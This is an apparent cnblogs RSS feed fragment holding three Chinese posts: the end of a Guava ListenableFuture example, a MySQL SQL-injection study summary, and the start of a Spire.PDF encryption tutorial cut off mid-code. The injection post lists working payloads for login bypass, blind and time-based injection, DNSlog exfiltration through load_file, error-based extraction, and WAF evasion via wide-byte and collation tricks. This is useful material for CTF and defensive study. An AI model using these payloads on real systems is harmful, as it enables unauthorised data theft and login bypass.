&lt;p&gt;对应JDK中的 &lt;a href=&quot;http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ExecutorService.html#submit(java.util.concurrent.Callable)&quot; rel=&quot;nofollow&quot;&gt;&lt;tt&gt;ExecutorService.submit(Callable)&lt;/tt&gt;&lt;/a&gt; 提交多线程异步运算的方式，Guava 提供了&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/ListeningExecutorService.html&quot; rel=&quot;nofollow&quot;&gt;&lt;tt&gt;ListeningExecutorService&lt;/tt&gt;&lt;/a&gt; 接口, 该接口返回 &lt;tt&gt;ListenableFuture&lt;/tt&gt; 而相应的 &lt;tt&gt;ExecutorService&lt;/tt&gt; 返回普通的 &lt;tt&gt;Future&lt;/tt&gt;。将 &lt;tt&gt;ExecutorService&lt;/tt&gt; 转为 &lt;tt&gt;ListeningExecutorService，&lt;/tt&gt;可以使用&lt;tt&gt;&lt;a href=&quot;http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/util/concurrent/MoreExecutors.html#listeningDecorator(java.util.concurrent.ExecutorService)&quot; rel=&quot;nofollow&quot;&gt;MoreExecutors.listeningDecorator(ExecutorService)&lt;/a&gt;进行装饰。&lt;/tt&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
ListeningExecutorService service = MoreExecutors.listeningDecorator(Executors.newFixedThreadPool(10&lt;span&gt;));&lt;/span&gt;&lt;span&gt;
ListenableFuture explosion &lt;/span&gt;= service.submit(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Callable() {&lt;/span&gt;
  &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Explosion call() {&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt;&lt;span&gt; pushBigRedButton();&lt;/span&gt;&lt;span&gt;
  }&lt;/span&gt;&lt;span&gt;
});&lt;/span&gt;&lt;span&gt;
Futures.addCallback(explosion, &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; FutureCallback() {&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; we want this handler to run immediately after we push the big red button!&lt;/span&gt;
  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; onSuccess(Explosion explosion) {&lt;/span&gt;&lt;span&gt;
    walkAwayFrom(explosion);&lt;/span&gt;&lt;span&gt;
  }&lt;/span&gt;
  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; onFailure(Throwable thrown) {&lt;/span&gt;&lt;span&gt;
    battleArchNemesis(); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; escaped the explosion!&lt;/span&gt;&lt;span&gt;
  }&lt;/span&gt;&lt;span&gt;
});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/div&gt;
</description>
<pubDate>Wed, 09 Jan 2019 07:12:00 +0000</pubDate>
<dc:creator>2货我怕谁</dc:creator>
<og:description>Guava地址：https://github.com/google/guava 第一次接触我是在16年春github上，当时在找单机查缓存方法，google guava当初取名是因为JAVA的类库不好</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jay-wu/p/10244501.html</dc:identifier>
</item>
<item>
<title>sql注入总结(一)--2018自我整理 - sijidou</title>
<link>http://www.cnblogs.com/sijidou/p/10243458.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sijidou/p/10243458.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;SQL注入总结&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;本文和之后的总结都是进行总结，详细实现过程细节可能不会写出来~&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所有sql语句均是mysql数据库的，其他数据库可能有些函数不同，但是方法大致相同&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;0x00 SQL注入原理：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;0x01 SQL注意一般方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;正常查询语句如下&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;mysql_query&lt;/span&gt;(&quot; select username,age from userinfo where id='$_GET['id']' &quot;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;万能密码&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
' or '1'='1　　　　　　　　//完整语句 select username,age from userinfo where id='' or '1'='1'&lt;br/&gt;' or 1=1#　　　　　　　　　//完整语句 select username,age from userinfo where id='' or 1=1#'&lt;br/&gt;'=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=''=0#
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;使用union进行联合查询&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
xx' union select 1,(select database()) #&lt;br/&gt;xx' union select (select database()),2 or '　　　　　　//这里如果把查询语句放到2的位置上，因为or的关系会不能显示正常查询的内容 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个结果是在输出列为我们可控的 database()和'2'这2个值，那么如果登录页面的验证逻辑是如下形式&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$result = mysql_query&lt;/span&gt;(&quot; select username,password from userinfo where id='&lt;span&gt;$_GET&lt;/span&gt;['username']' &quot;);&lt;br/&gt;if(md5($_GET['password']) === $result['password']){&lt;br/&gt;　　echo &quot;登录成功&quot;;&lt;br/&gt;}&lt;br/&gt;else{&lt;br/&gt;　　echo &quot;登录失败&quot;;&lt;br/&gt;}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 我们便可以通过下来方法构造来绕过用户名和密码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
账户：xx' union select 1,'c81e728d9d4c2f636f067f89cc14862c' #　　　　　　//c81e728d9d4c2f636f067f89cc14862c是2的md5值&lt;br/&gt;密码：2
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;使用bool回显判断注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;substr(str,start,long)&lt;/p&gt;
&lt;p&gt;　　str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度&lt;/p&gt;
&lt;p&gt;if(exp1,exp2,exp3)&lt;/p&gt;
&lt;p&gt;　　如果满足exp1,那么执行exp2,否则执行exp3&lt;/p&gt;
&lt;p&gt;注入语句&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
xx' or if((substr((select database()),1,1)='c'),1,0) #　　　　//判断数据库第一个字符是否为c
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么查询第二个字符可以用下列方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
xx' or if((substr((select database()),1,2)='ct'),1,0) #　　　　
&lt;/pre&gt;
&lt;pre&gt;
xx' or if((substr((select database()),2,1)='t'),1,0) #　　　　
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;假设 , (逗号)被过滤了，可以用如下方式处理&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;　if(exp1, exp2, exp3) =&amp;gt; case when exp1 then exp2 else exp3 end&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span class=&quot;md-tab&quot;&gt;　&lt;span class=&quot;md-expand&quot;&gt;substr(exp1, 1, 1) =&amp;gt; substr(exp1) from 1 for 1&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
xx' or case when (substr((select database()) from 1 for 1)='c') then 1 else 0 end #
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;假设substr被过滤了，可以用如下方式处理&lt;/p&gt;
&lt;p&gt;LOCATE(&lt;span&gt;substr,str,&lt;span&gt;pos&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;　　返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;　　ps：因为mysql对大小写不敏感，所有写的时候用 locate(binary'S', str, 1) 加个binary即可&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;xx' or if((locate(binary'c',(select database()),1)=1),1,0) #&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;xx' or if((locate(binary't',(select database()),1)=2),1,0) #
&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;使用延迟注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功&lt;/p&gt;
&lt;p&gt;延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显&lt;/p&gt;
&lt;p&gt;还是利用if来判断结果正确与否，只是返回值用延时来代替1&lt;/p&gt;
&lt;p&gt;方法：sleep，benchmark， 笛卡尔积等（其他的我还是太菜不太会用）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;基于sleep的延迟 &lt;/span&gt;&lt;br/&gt;&lt;span&gt;xx' or &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;/span&gt;(length((select database()))&amp;gt;1,&lt;span&gt;sleep&lt;/span&gt;(5),1&lt;span&gt;) #
&lt;br/&gt;基于笛卡尔乘积运算时间造成的时间延迟
xx' or if&lt;/span&gt;(length((select database()))&amp;gt;1,(select &lt;span&gt;count&lt;/span&gt;(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1&lt;span&gt;) # &lt;p&gt;基于benchmark的延迟 &lt;br/&gt;&lt;/p&gt;&lt;/span&gt;xx'or if(length((select database()))&amp;gt;1,(select BENCHMARK(10000000,md5('a'))),1) #--大概会用2S时间
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用DNSlog进行数据回显&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;原理网上很多文章都有，这里稍微总结下使用技巧&lt;/p&gt;
&lt;p&gt;load_file()&lt;/p&gt;
&lt;p&gt;　　读取文件并返回文件内容为字符串。&lt;/p&gt;
&lt;p&gt;这里先在ceye.io上注册个账号看看自己的子域名就行&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
xx'or if(length((select database()))&amp;gt;1,(select load_file(concat('\\\\',(select database()),'.你账号的子域名.ceye.io\\a'))),1) # 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;只要能够写select的地方，并且能够调用load_file函数就能执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109122423553-1822791446.png&quot; alt=&quot;&quot; width=&quot;809&quot; height=&quot;50&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;报错注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容&lt;/p&gt;
&lt;p&gt;报错注入函数很多，这里就介绍两种&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
xx' and (updatexml(1,concat(1,(select database()),1),1&lt;span&gt;))　　　　# 用 or连接也行
xx' and (extractvalue(&lt;/span&gt;1,concat(1,(select database()),1)))　　　&lt;span&gt;# 用 or连接也行&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;0x02 SQL注入的技巧:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该小结的例句还是以0x01节的原始查询语句相同&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mid切割字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;常常会出现回显字符串长度的限制，我们可以用mid来切割&lt;/p&gt;
&lt;p&gt;mid(str, start[, length])&lt;/p&gt;
&lt;p&gt;　　str为待切割的字符串，start为从第几个位置开始,length(没有则返回后面所有)为切割长度&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
xxx' union select (mid((select database()),1,2))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在写到这时，发现mid和substr作用很像，自己测试也一下可以在有时&quot;代替&quot;substr进行bool型判断&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
xx' or if(mid((select database()),2,1)='t',1,0) #
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;hex编码与字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;字符串在某种意义上是和它的hex值等价的，举个栗子&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
select * from admin where id = '1'    &amp;lt;===&amp;gt;  select * from admin where id = 0x31
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在&quot;好不容易&quot;逃逸第一个 '(单引号)后，后面的有会有查询关键字需要单引号会破坏sql语句结构时候用&lt;/p&gt;
&lt;p&gt;或者一些关键字被过滤了，但是又会出现在查询里面&lt;/p&gt;
&lt;p&gt;能够被hex编码的内容必须是字符串，即'(被单引号括起来)'的内容。关键字是不能被编码的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用group_concat连接多行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 有些时候返回值只能显示一行内容，这时候有2种办法&lt;/p&gt;
&lt;p&gt;用limit一行一行的运行&lt;/p&gt;
&lt;p&gt;用group_concat将内容连在一行一并输出&lt;/p&gt;
&lt;p&gt;可见group_concat比limit要方便一点，使用方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
xx' union select 1,2,(select group_concat(name，id) from admin) #
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;它输出格式是每个元组用逗号隔开的(我这里email是我在做其他测试时候瞎填的)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109133111315-1086071877.png&quot; alt=&quot;&quot; height=&quot;50&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用like和regexp来进行匹配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; like后面能进行模糊匹配，关键字内容为&lt;/p&gt;
&lt;p&gt;%　　　　=&amp;gt; 匹配任意个字符串&lt;/p&gt;
&lt;p&gt;_　　　　 =&amp;gt; 匹配一个字符&lt;/p&gt;
&lt;p&gt;但是存在前提，被匹配的字符可以是select查询语句，可以是该表内的字段，可以是返回为字符串的函数比如database()&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
xx' or database() like 'c%' #&lt;span&gt;
xx&lt;/span&gt;' or database() like 'ct_' #&lt;br/&gt;xx' or name like 'siji%' #&lt;br/&gt;xx' or (select dd from uesrinfo) like 'h%' #
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在某种程度上regexp和like的效果差不多，但是它是支持正则表达式&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
xx' or database() like '^c.f$'&lt;span&gt; #&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 但是这样不方便，测试一下后发现可以用这个方法逐个匹配&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
xx' or name regexp '^s$*'
&lt;/pre&gt;
&lt;pre&gt;
xx' or name regexp '^si$*'
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;mysql的GBK导致的宽字节注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为gbk是2个字节为一个编码，而我们如果把字符用url编码后%xx是一个字节，%xx%xx才表示一个gbk编码。在post或者get传参的时候会自动进行一次url解码&lt;/p&gt;
&lt;p&gt;常见的过滤为addslashes(str)会把 ' 转义为 \' 导致注入失败&lt;/p&gt;
&lt;p&gt;那么在宽字节注入的时候&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
xx' union select 1,2,database() # 　　　　//是会被拦截的&lt;br/&gt;xx%df' union select 1,2,datbase() #　　　 //款字节注入，会把\'组合在一起
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109144139622-1954433630.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个是还没进数据库前的样子，因为web页面解析用的utf-8所以达到了这个效果。而实际进入数据库是这样的，看看日志(该文件编码是utf-8)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109144949627-1705224551.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将文件用gbk编码形式打开&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109145501432-326465736.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;无论设置没有设置gbk传进去的字符样子没啥变化，但是内部处理机制发生了变化。总而言之gbk把 β\ 当成一个字符，而不是gbk模式下 β \ 是被当成2个字符&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mysql关于utf-8编码问题&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;是无法像GBK用宽字节绕过 ' ，但是在数据库中utf-8分为2种校对模式&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span class=&quot;md-tab&quot;&gt;utf8_unicode_ci&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span class=&quot;md-tab&quot;&gt;该模式会把特殊字母转换成2个正规英文，例如ß=ss&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span class=&quot;md-tab&quot;&gt;utf8_general_ci&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span class=&quot;md-tab&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;该模式会把特殊字符转换成1个正规英文，例如Ä = A，Ö = O，Ü = U&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span class=&quot;md-tab&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;比如是utf8_general_ci模式，下面是$sql1会被拦截，而$sql2不会被拦截&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
$sql1 = select * from admin where id = 'xx' union select 1,2,database() #&lt;br/&gt;$sql2 = select * from admin where id = 'xx' uni&lt;span class=&quot;md-tab&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;Ö&lt;/span&gt;&lt;/span&gt;n select 1,2,database() #&lt;br/&gt;if(preg_match('/union/i',&lt;span&gt;$sql1&lt;/span&gt;) &amp;gt; 0){&lt;br/&gt;　　echo 'waf';&lt;br/&gt;}&lt;br/&gt;else{&lt;br/&gt;　　执行sql语句&lt;br/&gt;}
&lt;/pre&gt;
&lt;pre&gt;
if(preg_match('/union/i',&lt;span&gt;$sql2) &amp;gt; 0){&lt;br/&gt;　　echo 'waf';&lt;br/&gt;}&lt;br/&gt;else{&lt;br/&gt;　　执行sql语句&lt;br/&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0xff结语：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这章就先把基础的和ctf中遇到的姿势写了写，sql注入还会写关于二次注入，简要的python脚本心得和点bypass总结&lt;/p&gt;

</description>
<pubDate>Wed, 09 Jan 2019 07:02:00 +0000</pubDate>
<dc:creator>sijidou</dc:creator>
<og:description>SQL注入总结 前言： 本文和之后的总结都是进行总结，详细实现过程细节可能不会写出来~ 所有sql语句均是mysql数据库的，其他数据库可能有些函数不同，但是方法大致相同 0x00 SQL注入原理：</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sijidou/p/10243458.html</dc:identifier>
</item>
<item>
<title>Java 加密、解密PDF文档 - E-iceblue</title>
<link>http://www.cnblogs.com/Yesi/p/10244405.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Yesi/p/10244405.html</guid>
<description>&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span&gt;&lt;span&gt;本篇文章将介绍通过&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;Java&lt;/span&gt;&lt;span&gt;编程来设置&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;PDF&lt;/span&gt;&lt;span&gt;文档保护的方法。我们可以设置仅用于查阅文档的密码，即该通过该密码打开文档仅用于文档阅读，无法编辑；也可以设置文档编辑权限的密码，即通过该密码打开文档时，文档为可编辑状态。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;strong&gt;&lt;span&gt;使&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;用工具：&lt;/span&gt;&lt;/strong&gt;&lt;a href=&quot;https://www.e-iceblue.cn/Downloads/Free-Spire-PDF-JAVA.html&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;Free Spire.PDF for Java V2.0.0&lt;/span&gt;&lt;/a&gt;&lt;span&gt;（免费版）&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;strong&gt;&lt;span&gt;关于&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot;&gt;jar&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;文件引用&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;步骤&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;1&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;在&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;Java&lt;/span&gt;&lt;span&gt;程序中新建一个文件夹可命名为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;Lib&lt;/span&gt;&lt;span&gt;。下载安装包后，解压，将解压后的文件夹下的子文件夹&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;lib&lt;/span&gt;&lt;span&gt;中的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;Spire.Pdf.jar&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;Spire.Common.jar&lt;/span&gt;&lt;span&gt;两个文件复制到新建的文件夹下，如下图：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201901/706090-20190109145316280-1265754890.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;步骤 2：建好文件夹后，引用两个文件：选中这两个jar文件，点击鼠标右键，选择“Build Path” – “Add to Build Path”。如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201901/706090-20190109145343748-2040348123.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;【示例1】加密PDF文档&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.EnumSet;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.spire.pdf.PdfDocument;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.spire.pdf.security.PdfEncryptionKeySize;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.spire.pdf.security.PdfPermissionsFlags;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; EncryptPDF {

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建PdfDocument实例&lt;/span&gt;
        PdfDocument doc = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PdfDocument();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加载PDF文件&lt;/span&gt;
        doc.loadFromFile(&quot;sample.pdf&quot;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加密PDF文件&lt;/span&gt;
        PdfEncryptionKeySize keySize =&lt;span&gt; PdfEncryptionKeySize.Key_128_Bit;
        String openPassword &lt;/span&gt;= &quot;123456&quot;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;打开文档时，仅用于查看文档&lt;/span&gt;
        String permissionPassword = &quot;test&quot;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;打开文档时，可编辑文档&lt;/span&gt;
        EnumSet flags =&lt;span&gt; EnumSet.of(PdfPermissionsFlags.Print, PdfPermissionsFlags.Fill_Fields);
        doc.getSecurity().encrypt(openPassword, permissionPassword, flags, keySize);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存文件&lt;/span&gt;
        doc.saveToFile(&quot;Encrypt.pdf&quot;&lt;span&gt;);
        doc.close();             
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;完成代码后，运行程序，生成文档。打开文档时，输入密码，可查看文档加密的具体情况。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201901/706090-20190109145508975-413015482.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;【示例2】解除PDF密码保护&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.spire.pdf.PdfDocument;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.spire.pdf.security.PdfEncryptionKeySize;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.spire.pdf.security.PdfPermissionsFlags;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DecryptPDF {

